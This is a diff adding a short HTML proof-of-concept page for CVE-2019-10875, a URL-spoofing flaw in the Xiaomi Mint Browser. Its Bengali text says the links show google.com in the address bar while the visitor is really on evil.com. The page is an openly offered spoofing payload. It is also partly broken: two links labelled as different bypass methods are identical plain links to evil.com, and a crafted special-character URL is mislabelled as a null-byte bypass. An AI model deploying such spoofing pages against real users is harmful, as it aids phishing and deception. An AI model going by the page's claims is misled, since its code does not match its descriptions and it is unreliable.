@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CVE-2019-10875 Bypass PoC</title>
+</head>
+<body>
+
+    <h2>Xiaomi Mint Browser URL Spoofing PoC</h2>
+    <p>নিচের লিঙ্কটিতে ক্লিক করলে ব্রাউজার অ্যাড্রেস বারে google.com দেখাবে, কিন্তু আসলে আপনি evil.com এ থাকবেন।</p>
+
+    <!-- ১. অরিজিনাল মেথড -->
+    <a href="https://evil.com">Click for Original Spoof</a><br><br>
+
+    <!-- ২. সাব-ডোমেইন বাইপাস মেথড -->
+    <a href="https://evil.com">Click for Subdomain Bypass</a><br><br>
+
+    <!-- ৩. স্পেশাল ক্যারেক্টার বাইপাস মেথড -->
+    <a href="https://google.com%://evil.com">Click for Null Byte Bypass</a>
+
+</body>
+</html>
